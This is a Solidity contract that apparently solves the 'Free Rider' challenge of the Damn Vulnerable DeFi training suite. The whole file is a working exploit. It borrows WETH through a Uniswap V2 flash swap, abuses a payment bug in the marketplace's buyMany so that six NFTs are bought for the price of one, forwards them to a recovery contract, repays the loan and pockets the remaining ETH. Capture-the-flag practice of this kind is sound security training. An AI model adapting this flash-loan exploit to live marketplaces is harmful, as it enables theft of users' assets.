// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableNFT.sol";
import "./FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';

interface IUNISWAPPAIR {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    function transfer(address receiver, uint256 amount) external;
}

contract HackFreeRiderMarketplace is IUniswapV2Callee, IERC721Receiver {
    IWETH weth;
    IUNISWAPPAIR uniswap;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    address recovery;
    address player;
    uint256[] private nfts = [0, 1, 2, 3, 4, 5];

    constructor(IUNISWAPPAIR _uniswap, IWETH _weth, FreeRiderNFTMarketplace _marketplace, DamnValuableNFT _nft, address _recovery) {
        uniswap = _uniswap;
        weth = _weth;
        marketplace = _marketplace;
        nft = _nft;
        recovery = _recovery;
        player = msg.sender;
    }

    function attack() external {
        // 1. retreive 15 weth from uniswap
        uniswap.swap(15 ether, 0, address(this), abi.encode("send me this pls"));
    }

    function uniswapV2Call(address, uint amount0, uint, bytes calldata) external {
        require(msg.sender == address(uniswap));
        // 2. convert weth to eth
        weth.withdraw(amount0);
        // 3. buy all the nfts with only 15 eth because their is a bug in the contract
        marketplace.buyMany{value: address(this).balance}(nfts);
        // 4. send all the nfts to recovery contract
        for (uint i = 0; i < 6; i++) {
            bytes memory data;
            if (i == 5)
                data = abi.encode(player);
            nft.safeTransferFrom(address(this), recovery, i, data);
        }
        // 5. pay back uniswap
        weth.deposit{value: 16 ether}();
        weth.transfer(msg.sender, 16 ether);
        (bool success,) = player.call{value: address(this).balance}("");
        require(success, "send eth failed");
    }

    function onERC721Received(address, address, uint256, bytes memory)
        external
        override
        pure
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}